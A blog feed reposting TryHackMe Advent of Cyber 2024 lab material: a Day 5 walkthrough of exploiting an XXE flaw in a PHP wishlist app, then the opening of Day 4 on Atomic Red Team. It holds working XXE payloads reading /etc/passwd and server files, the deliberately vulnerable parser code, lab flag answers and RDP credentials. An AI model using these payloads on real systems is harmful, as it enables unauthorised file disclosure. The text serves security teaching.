<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">people</span> <span class="p">[</span>
   <span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="nx">ext</span> <span class="nx">SYSTEM</span> <span class="dl">"</span><span class="s2">http://tryhackme.com/robots.txt</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="p">]</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">people</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nx">name</span><span class="o">&gt;</span><span class="nx">Glitch</span><span class="o">&lt;</span><span class="sr">/name</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="nx">address</span><span class="o">&gt;&amp;</span><span class="nx">ext</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/address</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="nx">email</span><span class="o">&gt;</span><span class="nx">glitch</span><span class="p">@</span><span class="nd">wareville</span><span class="p">.</span><span class="nx">com</span><span class="o">&lt;</span><span class="sr">/email</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="nx">phone</span><span class="o">&gt;</span><span class="mi">111000</span><span class="o">&lt;</span><span class="sr">/phone</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/people</span><span class="err">&gt;
</span></code></pre></div></div>

<p>We are specifically discussing external entities because it is one of the main reasons that XXE is introduced if it is not properly managed.</p>

<p><strong>XML External Entity (XXE)</strong></p>

<p>After understanding XML and how entities work, we can now explore the XXE vulnerability. XXE is an attack that takes advantage of <strong>how XML parsers handle external entities</strong>. When a web application processes an XML file that contains an external entity, the parser attempts to load or execute whatever resource the entity points to. If necessary sanitisation is not in place, the attacker may point the entity to any malicious source/code causing the undesired behaviour of the web app.</p>

<p>For example, if a vulnerable XML parser processes this external entity definition:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">people</span><span class="p">[</span>
   <span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="nx">thmFile</span> <span class="nx">SYSTEM</span> <span class="dl">"</span><span class="s2">file:///etc/passwd</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="p">]</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">people</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nx">name</span><span class="o">&gt;</span><span class="nx">Glitch</span><span class="o">&lt;</span><span class="sr">/name</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="nx">address</span><span class="o">&gt;&amp;</span><span class="nx">thmFile</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/address</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="nx">email</span><span class="o">&gt;</span><span class="nx">glitch</span><span class="p">@</span><span class="nd">wareville</span><span class="p">.</span><span class="nx">com</span><span class="o">&lt;</span><span class="sr">/email</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="nx">phone</span><span class="o">&gt;</span><span class="mi">111000</span><span class="o">&lt;</span><span class="sr">/phone</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/people</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Here, the entity <code class="language-plaintext highlighter-rouge">&amp;thmFile;</code> refers to the sensitive file <code class="language-plaintext highlighter-rouge">/etc/passwd</code>on a system. When the XML is processed, the parser will try to load and display the contents of that file, exposing sensitive information to the attacker. \n</p>

<p>In the upcoming tasks, we will examine how XXE works and how to exploit it.</p>

<p>Connecting to the Machine</p>

<p>Before moving forward, review the questions in the connection card shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1731002645527.png" alt="Connetion card, AttackBox and Virtual Machine." /></p>

<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> button below to start the virtual machine. While the virtual machine starts, click on the <strong>Start AttackBox</strong> button at the top of the page and browse <strong>Wareville’s WishVille</strong> application at <code class="language-plaintext highlighter-rouge">http://MACHINE_IP</code>. Please wait 1-2 minutes after the system boots completely to let the auto scripts run successfully.</p>

<p>Practical</p>

<ul>
  <li>\</li>
</ul>

<p>Now that you understand the basic concepts related to XML and XXE, we will analyse an application that allows users to view and add products to their carts and perform the checkout activity. You can access the Wareville application hosted on <code class="language-plaintext highlighter-rouge">http://MACHINE_IP</code>. This application allows users to request their Christmas wishes.</p>

<p><strong>Flow of the Application</strong> \n</p>

<p>As a penetration tester, it is important to first analyse the flow of the application. First, the user will browse through the products and add items of interest to their wishlist at <code class="language-plaintext highlighter-rouge">http://MACHINE_IP/product.php</code>. Click on the <code class="language-plaintext highlighter-rouge">Add to Wishlist</code> under <code class="language-plaintext highlighter-rouge">Wareville's Jolly Cap</code>, as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730813202090.png" alt="Web application's product page." /> \n</p>

<p>After adding products to the wishlist, click the <code class="language-plaintext highlighter-rouge">Cart</code> button or visit <code class="language-plaintext highlighter-rouge">http://MACHINE_IP/cart.php</code> to see the products added to the cart. On the <code class="language-plaintext highlighter-rouge">Cart</code> page, click the <code class="language-plaintext highlighter-rouge">Proceed to Checkout</code> button to buy the items as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730813300580.png" alt="Web application's cart details." /> \n</p>

<p>On the checkout page, the user will be prompted to enter his name and address as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730813382277.png" alt="Web application's checkout details." /> \n</p>

<p>Enter any name of your choice and address, and click on <code class="language-plaintext highlighter-rouge">Complete Checkout</code> to place the wish. Once you complete the wish, you will be shown the message <strong>“Wish successful. Your wish has been saved as Wish #21”</strong>, as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730813503366.png" alt="Wish #21 saved in a new file." /> \n</p>

<p><strong>Wish #21</strong> indicates the wishes placed by a user on the website. Once you click on <strong>Wish #21</strong>, you will see a forbidden page because the details are only accessible to <code class="language-plaintext highlighter-rouge">admins</code>. But can we try to bypass this and access other people’s wishes? This is what we will try to perform in this task.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730813503096.png" alt="Error page when accessing the new wish page." /> \n</p>

<p><strong>Intercepting the Request</strong> \n</p>

<p>Before discussing exploiting XXE on the web, let’s learn how to intercept the request. First, we need to configure the environment so that, as a pentester, all web traffic from our browser is routed through Burp Suite. This allows us to see and manipulate the requests as we browse.</p>

<p>We will use Burp Suite, a powerful web vulnerability scanner, to intercept and modify requests for this exploitation. You can access Burp Suite in the <code class="language-plaintext highlighter-rouge">AttackBox</code>. On the desktop of the AttackBox, you will see a Burp Suite icon as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728456762740.png" alt="Burp suite icon" /> \n</p>

<p>Once you click the icon, Burp Suite will open with an introductory screen. You will see a message like “<strong>Welcome to Burp Suite</strong>”. Click on the <code class="language-plaintext highlighter-rouge">Next</code> button.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728457165300.png" alt="Burp suite splash screen" /> \n</p>

<p>On the next screen, you will have the option to <code class="language-plaintext highlighter-rouge">Start Burp</code>. Click on the <code class="language-plaintext highlighter-rouge">Start Burp</code> button to start the tool.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728457184817.png" alt="Burp suite startup setting screen" /> \n</p>

<p>Once Burp Suite has started, you will see its main interface with different tabs, such as <code class="language-plaintext highlighter-rouge">Proxy</code>, <code class="language-plaintext highlighter-rouge">Intruder</code>, <code class="language-plaintext highlighter-rouge">Repeater</code> and others.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728630460840.png" alt="Burp suite dashboard with options" /> \n</p>

<p>Inside Burp Suite, click the <code class="language-plaintext highlighter-rouge">Settings</code> tab at the top right. You will see Burp’s browser option available under the <code class="language-plaintext highlighter-rouge">Tools</code> section. Enable <code class="language-plaintext highlighter-rouge">Allow Burp's browser to run without a sandbox option</code> and click on the <strong>close icon</strong> on the top right corner of the <code class="language-plaintext highlighter-rouge">Settings</code> tab as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728459438650.png" alt="Enabling Burp browser settings" /> \n</p>

<p>After allowing the browser to run without a sandbox, we would now be able to start the browser with pre-configured Burp Suite’s proxy. Navigate to the <code class="language-plaintext highlighter-rouge">Open browser</code> option located at the <code class="language-plaintext highlighter-rouge">Proxy -&gt; Intercept</code> section of Burp.  Open the browser by clicking the <code class="language-plaintext highlighter-rouge">Open browser</code> as shown below and browse the URL <code class="language-plaintext highlighter-rouge">http://MACHINE_IP</code>, so that all requests are intercepted:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728625481652.png" alt="opening browser with in Burp suite" /> \n</p>

<p>Once you browse the URL, all the requests are intercepted and can be seen under the <code class="language-plaintext highlighter-rouge">Proxy-&gt;HTTP history</code> tab.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730813727577.png" alt="HTTP history tab of Burp." /> \n</p>

<p><strong>What is Happening in the Backend?</strong></p>

<p>Now, when you visit the URL, <code class="language-plaintext highlighter-rouge">http://MACHINE_IP/product.php</code>, and click <code class="language-plaintext highlighter-rouge">Add to Wishlist</code>, an AJAX call is made to <code class="language-plaintext highlighter-rouge">wishlist.php</code> with the following XML as input.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">wishlist</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="nx">user_id</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">&lt;</span><span class="sr">/user_id</span><span class="err">&gt;
</span>     <span class="o">&lt;</span><span class="nx">item</span><span class="o">&gt;</span>
       <span class="o">&lt;</span><span class="nx">product_id</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">&lt;</span><span class="sr">/product_id</span><span class="err">&gt;
</span>     <span class="o">&lt;</span><span class="sr">/item</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/wishlist</span><span class="err">&gt;
</span>

</code></pre></div></div>

<p>In the above XML, **<product_id>** tag contains the ID of the product, which is **1** in this case. Now, let's review the `Add to Wishlist` request logged in Burp Suite's `HTTP History` option under the proxy tab. As discussed above, the request contains XML being forwarded as a `POST` request, as shown below:</product_id></p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1729006687410.png" alt="View of the request sent to wishlist.php using Burp." /> \n</p>

<p>This <code class="language-plaintext highlighter-rouge">wishlist.php</code> accepts the request and parses the request using the following code:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">&lt;</span><span class="p">?</span><span class="nx">php</span>
<span class="p">..</span>
<span class="p">...</span>
<span class="nf">libxml_disable_entity_loader</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
<span class="nx">$wishlist</span> <span class="o">=</span> <span class="nf">simplexml_load_string</span><span class="p">(</span><span class="nx">$xml_data</span><span class="p">,</span> <span class="dl">"</span><span class="s2">SimpleXMLElement</span><span class="dl">"</span><span class="p">,</span> <span class="nx">LIBXML_NOENT</span><span class="p">);</span>

<span class="p">...</span>
<span class="p">..</span>
<span class="nx">echo</span> <span class="dl">"</span><span class="s2">Item added to your wishlist successfully.</span><span class="dl">"</span><span class="p">;</span>
<span class="p">?</span><span class="o">&gt;</span>


</code></pre></div></div>

<p><strong>Preparing the Payload</strong></p>

<p>When a user sends specially crafted XML data to the application, the line <code class="language-plaintext highlighter-rouge">libxml_disable_entity_loader(false)</code> allows the XML parser to load external entities. This means the XML input can include external file references or requests to remote servers. When the XML is processed by <code class="language-plaintext highlighter-rouge">simplexml_load_string</code> with the <code class="language-plaintext highlighter-rouge">LIBXML_NOENT</code>option, the web app resolves external entities, allowing attackers access to sensitive files or allowing them to make unintended requests from the server. \n</p>

<p>What if we update the XML request to include references for external entities? We will use the following XML instead of the above XML:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">&lt;!--</span><span class="p">?</span><span class="nx">xml</span> <span class="nx">version</span><span class="o">=</span><span class="dl">"</span><span class="s2">1.0</span><span class="dl">"</span> <span class="p">?</span><span class="o">--&gt;</span>
<span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">foo</span> <span class="p">[</span><span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="nx">payload</span> <span class="nx">SYSTEM</span> <span class="dl">"</span><span class="s2">/etc/hosts</span><span class="dl">"</span><span class="o">&gt;</span> <span class="p">]</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">wishlist</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="nx">user_id</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">&lt;</span><span class="sr">/user_id</span><span class="err">&gt;
</span>     <span class="o">&lt;</span><span class="nx">item</span><span class="o">&gt;</span>
       <span class="o">&lt;</span><span class="nx">product_id</span><span class="o">&gt;&amp;</span><span class="nx">payload</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/product_id</span><span class="err">&gt;
</span>     <span class="o">&lt;</span><span class="sr">/item</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/wishlist</span><span class="err">&gt;
</span>

</code></pre></div></div>

<p>When we send this updated XML payload, the first two lines introduce an external entity called <strong>payload</strong>. The line &lt;<strong>!ENTITY payload SYSTEM “/etc/hosts”&gt;</strong> tells the XML parser to replace the <strong>&amp;payload;</strong> reference with the contents of the file <strong>/etc/hosts</strong> on the server. When the XML is processed, instead of a normal <strong>product_id</strong>, the application will try to load and include the contents of the file specified in the entity (<code class="language-plaintext highlighter-rouge">/etc/hosts</code>).</p>

<p><strong>Exploitation</strong></p>

<p>Now, let’s perform the exploitation by repeating the request we captured earlier. The Burp Suite tool has a feature known as <code class="language-plaintext highlighter-rouge">Repeater</code> that allows you to send multiple HTTP requests. We will use this feature to duplicate our <code class="language-plaintext highlighter-rouge">HTTP POST</code> request and send it multiple times to exploit the vulnerability. Right-click on the <code class="language-plaintext highlighter-rouge">wishlist.php</code> POST request and click on <code class="language-plaintext highlighter-rouge">Send to Repeater</code>. \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1729012048433.png" alt="Instructions to send a request to the Repeater tab." />** \n **</p>

<p>Now, switch to the <code class="language-plaintext highlighter-rouge">Repeater</code> tab, where you’ll find the <code class="language-plaintext highlighter-rouge">POST</code> request that needs to be modified. We will update the XML payload with the new data as shown below and then send the modified request:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1729018934528.png" alt="Updated the XML with an XXE payload." /> \n</p>

<p>Place the mouse cursor inside the request in the <code class="language-plaintext highlighter-rouge">Repeater</code> tab in Burp Suite and press <code class="language-plaintext highlighter-rouge">Ctrl+V</code>  or paste the payload in the above-highlighted area.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1729019108929.png" alt="Initial XXE payload and its response." /> \n</p>

<p>When we clicked <code class="language-plaintext highlighter-rouge">Send</code>, the server processed the malicious XML payload, which included the external entity reference to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. As a result, the <code class="language-plaintext highlighter-rouge">wishlist.php</code> responded with the contents of the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, leading to an XXE vulnerability.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730283613622.png" alt="Software playing with the web." />Time for Some Action</p>

<p>Now that you’ve identified a vulnerability in the application, it’s time to see it in action! McSkidy Software has tasked us with finding loopholes, and we’ve successfully uncovered one in the <code class="language-plaintext highlighter-rouge">wishlist.php</code> endpoint. But our work doesn’t end there—let’s take it a step further and assess the potential impact this vulnerability could have on the application.</p>

<p>Earlier, we discovered a page accessible only by administrators, which seems like an exciting target. What if we could use the vulnerability we’ve found to access sensitive information, like the wishes placed by the townspeople?</p>

<p>Now that our objective is clear, let’s leverage the vulnerability we discovered to read the contents of each wishes page and demonstrate the full extent of this flaw to help McSkidy secure the platform. To get started, let’s recall the page that is only accessible by admins - <code class="language-plaintext highlighter-rouge">/wishes/wish_1.txt</code>. Using this path, we just need to guess the potential absolute path of the file. Typically, web applications are hosted on <code class="language-plaintext highlighter-rouge">/var/www/html</code>. With that in mind, let’s build our new payload to read the wishes while leveraging the vulnerability.</p>

<p><strong>Note: Not all web applications use the path /var/www/html, but web servers typically use it.</strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">&lt;!--</span><span class="p">?</span><span class="nx">xml</span> <span class="nx">version</span><span class="o">=</span><span class="dl">"</span><span class="s2">1.0</span><span class="dl">"</span> <span class="p">?</span><span class="o">--&gt;</span>
<span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">foo</span> <span class="p">[</span><span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="nx">payload</span> <span class="nx">SYSTEM</span> <span class="dl">"</span><span class="s2">/var/www/html/wishes/wish_1.txt</span><span class="dl">"</span><span class="o">&gt;</span> <span class="p">]</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">wishlist</span><span class="o">&gt;</span>
	<span class="o">&lt;</span><span class="nx">user_id</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">&lt;</span><span class="sr">/user_id</span><span class="err">&gt;
</span>	<span class="o">&lt;</span><span class="nx">item</span><span class="o">&gt;</span>
	       <span class="o">&lt;</span><span class="nx">product_id</span><span class="o">&gt;&amp;</span><span class="nx">payload</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/product_id</span><span class="err">&gt;
</span>	<span class="o">&lt;</span><span class="sr">/item</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/wishlist</span><span class="err">&gt;
</span>


</code></pre></div></div>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730814018118.png" alt="Leaking the wishes via XXE." /> \n</p>

<p>Surprisingly, we got lucky that our assumption worked. The next thing to do is see whether we can view more wishes using our discovery. To do this, let’s try replacing the <code class="language-plaintext highlighter-rouge">wish_1.txt</code> with <code class="language-plaintext highlighter-rouge">wish_2.txt</code>.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730814073518.png" alt="Iterating within the wishes via XXE." /> \n</p>

<p>As a result, we were able to view the next wish. You may observe that we just incremented the number by one. Given this, you may continue checking the other wishes and see all the wishes stored in the application.</p>

<p>After iterating through the wishes, we have proved the potential impact of the vulnerability, and anyone who leverages this could read the wishes submitted by the townspeople of Wareville.</p>

<p>Conclusion</p>

<p>It was confirmed that the application was vulnerable, and the developers were not at fault since they only wanted to give the townspeople something before Christmas. However, it became evident that bypassing security testing led to an application that did not securely handle incoming requests.</p>

<p>As soon as the vulnerability was discovered, McSkidy promptly coordinated with the developers to implement the necessary mitigations. The following proactive approach helped to address the potential risks against XXE attacks:</p>

<ul>
  <li><strong>Disable External Entity Loading</strong>: The primary fix is to disable external entity loading in your XML parser. In PHP, for example, you can prevent XXE by setting <code class="language-plaintext highlighter-rouge">libxml_disable_entity_loader(true)</code> before processing the XML.</li>
  <li><strong>Validate and Sanitise User Input</strong>: Always validate and sanitise the XML input received from users. This ensures that only expected data is processed, reducing the risk of malicious content being included in the request. For example, remove suspicious keywords like <code class="language-plaintext highlighter-rouge">/etc/host</code>, <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, etc, from the request.</li>
</ul>

<p>After discovering the vulnerability, McSkidy immediately remembered that a CHANGELOG file exists within the web application, stored at the following endpoint: <a href="http://MACHINE_IP/CHANGELOG">http://MACHINE_IP/CHANGELOG</a>. After checking, it can be seen that someone pushed the vulnerable code within the application after Software’s team.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1729260978473.png" alt="CHANGELOG data." /> \n</p>

<p>With this discovery, McSkidy still couldn’t confirm whether the Mayor intentionally made the application vulnerable. However, the Mayor had already become suspicious, and McSkidy began to formulate theories about his possible involvement.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730283636344.png" alt="Mayor Malware's schemes." /></p>

<p>Answer the questions below</p>

<p>What is the flag discovered after navigating through the wishes?</p>

<p>THM{Brut3f0rc1n6_mY_w4y}</p>

<p>What is the flag seen on the possible proof of sabotage?</p>

<p>THM{m4y0r_m4lw4r3_b4ckd00rs}</p>

<p>If you want to learn more about the XXE injection attack, check out the <a href="https://tryhackme.com/r/room/xxeinjection">XXE </a>room!</p>

<p>Following McSkidy’s advice, Software recently hardened the server.</p>

<p>It used to have many unneeded open ports, but not anymore. Not that this matters in any way.</p>]]></content><author><name>Paul Le</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[Advent of Cyber Day 5]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day5-logo.png" /><media:content medium="image" url="http://localhost:4000/Day5-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 4</title><link href="http://localhost:4000/Day4" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 4" /><published>2024-12-04T00:00:00-05:00</published><updated>2024-12-04T00:00:00-05:00</updated><id>http://localhost:4000/Day4</id><content type="html" xml:base="http://localhost:4000/Day4"><![CDATA[<h1 id="based-on-the-eventsource-field-what-aws-service-generates-the-consolelogin-eventday-4">Based on the eventSource field, what AWS service generates the ConsoleLogin event?Day 4</h1>

<p>NEW Advent of Cyber Task: Atomic Red Team</p>

<table>
  <tbody>
    <tr>
    </tr>
  </tbody>
</table>

<p>| <a href="https://e.customeriomail.com/e/c/eyJlbWFpbF9pZCI6ImRnVEsxUVVEQUllb1hJYW9YQUdUa25Sb20yLU1HRjV2NVYyYXFjVT0iLCJocmVmIjoiaHR0cHM6Ly90cnloYWNrbWUuY29tL3Ivcm9vbS9hZHZlbnRvZmN5YmVyMjAyND91dG1fc291cmNlPWN1c3RvbWVyLmlvXHUwMDI2dXRtX21lZGl1bT1lbWFpbFx1MDAyNnV0bV9jYW1wYWlnbj1hb2MyMDI0XHUwMDI2dXRtX2NvbnRlbnQ9ZGFpbHlfZW1haWxzIiwiaW50ZXJuYWwiOiJjYWQ1MDUzMmE2NjE4N2E4NWMiLCJsaW5rX2lkIjoxNjA3MX0/c59d13aca270bd8f6c18df807c10003d69c3eca704f593e7aff7f84be0ffaff3">   <img src="https://ci3.googleusercontent.com/meips/ADKq_Nbm6h-hqqbF-A5NVyxCrIDJGj0BG7orq40mahoNZZ_PfgZMMsPQuc1TWGiJiulVgyJ9UnWSOVyT9hfse4n-AZBn3ZmOU3Fx0mvAE1yBD6-CRnHjercYx7oTnuWihhrzDF0KJsc85VuliA2St9Sv4c01hK2ix7s-d2hMnWRTlI8NI6-10yWpwZ4g32jxfmoYODJqgN1uGxdWRjJ0gy0W4lNK6ZqE3eMkC-4dJmAnNIY2jis0Jg8=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731327229375_THM%20AoC%202024%20Logo%20White%20-%20900x600px_01JCDJ9ZH8BYM6E9WYP0SE4SG0.png" alt="" />   <img src="https://ci3.googleusercontent.com/meips/ADKq_NY8fGR6GcJAU5Hr3kzU7Dywis5ly6JZVo25hyAI0gsuGLqseM_8Bv-6yWrJMBdUjkvqeAzErKgFNNCxEz_knrD1lP97E_RmJc-P_Mmlx4jYgo6i44Y4kqnX4qXlZEfuNh0uhuuA-HrOicIuo-I-P3HOPwKjNzBnDCy1N_GhB6EY0OHr5DKqCexmA1QrsoPfaivWVlhMQ6U3Rt1hzr18JbCGiseT=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731663353758_AoC%20Design%203%20-%20Day%204_01JCQJVPDQ7SQ98KAMAKH24E48.png" alt="TryHackMe" title="TryHackMe" /></a>**Advent of Cyber: New Task Release!**I’m all atomic inside!   <img src="https://ci3.googleusercontent.com/meips/ADKq_NaGOHzvuF4oS-3bY93UdCw0ZnvTiy38kdRQgWWxuhVgxQ5AaCLs2JseseR8bJ8OD_lOK8L8U530UV5GWZlWclNwFhqmsM8b-NtKF4q2ZmKooHrmpif067VhySjBNxjh53nkrGFlKxYpciFFLsmesIJYfIrbR4p-Rx8HtufmuiIvH5jLoeXk-p_rBGYCqBYtya-yDiinVupr817_WVVz1Lf3IYM52VGEWtR94xv6CFM=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731663942745_Byte%20-%20AoC%20Character%20Card%20326px_01JCQKDNFEC53BWAVD6CH60XVA.png" alt="" />In day 4 of Advent of Cyber, the SOC team recreates Glitch’s steps and investigates breadcrumbs left by his security fixes. **Topics Covered:**Atomic Red Team |
|—-|</p>

<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730709355879.png" alt="Task banner for day DAY 4" /></p>

<p>SOC-mas is approaching! And the town of Warewille started preparations for the grand event.</p>

<p>Glitch, a quiet, talented security SOC-mas engineer, had a hunch that these year’s celebrations would be different. With looming threats, he decided to revamp the town’s security defences. Glitch began to fortify the town’s security defences quietly and meticulously. He started by implementing a protective firewall, patching vulnerabilities, and accessing endpoints to patch for security vulnerabilities. As he worked tirelessly, he left “breadcrumbs,” small traces of his activity.</p>

<p>Unaware of Glitch’s good intentions, the SOC team spotted anomalies: Logs showing admin access, escalation of privileges, patched systems behaving differently, and security tools triggering alerts. The SOC team misinterpreted the system modifications as a sign of an insider threat or rogue attacker and decided to launch an investigation using the Atomic Red Team framework.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-4-Atomic-Red-Animation.gif" alt="a &quot;candy&quot; styled pill being added to the window of a gingerbread house" /> \n</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Learn how to identify malicious techniques using the MITRE ATT&amp;CK framework.</li>
  <li>Learn about how to use Atomic Red Team tests to conduct attack simulations.</li>
  <li>Understand how to create alerting and detection rules from the attack tests.</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730733634851.png" alt="Banner showing the connection details for this room." /></p>

<p>Click on the green <strong>Start Machine</strong> button below to start the virtual machine and wait 1-2 minutes for the system to boot completely in a split-screen view.</p>

<p>If the virtual machine isn’t visible, use the blue <strong>Show Split View</strong> button at the top of the page.</p>

<p>Additionally, if you wish to connect to the machine via RDP, use the credentials below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM Key Credentials" /></p>

<table>
  <thead>
    <tr>
      <th><strong>Username</strong></th>
      <th>Administrator</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Password</strong></td>
      <td>Emulation101!</td>
    </tr>
    <tr>
      <td><strong>IP</strong></td>
      <td>MACHINE_IP</td>
    </tr>
  </tbody>
</table>

<p>The VM has Atomic Red Team and Sysmon installed. This will allow us to emulate an attack using TTPs described in the MITRE ATT&amp;CK framework.</p>

<h2 id="detection-gaps">Detection Gaps</h2>

<p>While it might be the utopian dream of every blue teamer, we will rarely be able to detect every attack or step in an attack kill chain. This is a reality that all blue teamers face: there are gaps in their detection. But worry not! These gaps do not have to be the size of black holes; there are things we can do to help make these gaps smaller.</p>

<p>Detection gaps are usually for one of two main reasons:</p>

<ul>
  <li><strong>Security is a cat-and-mouse game.</strong> As we detect more, the threat actors and red teamers will find new sneaky ways to thwart our detection. We then need to study these novel techniques and update our signature and alert rules to detect these new techniques.</li>
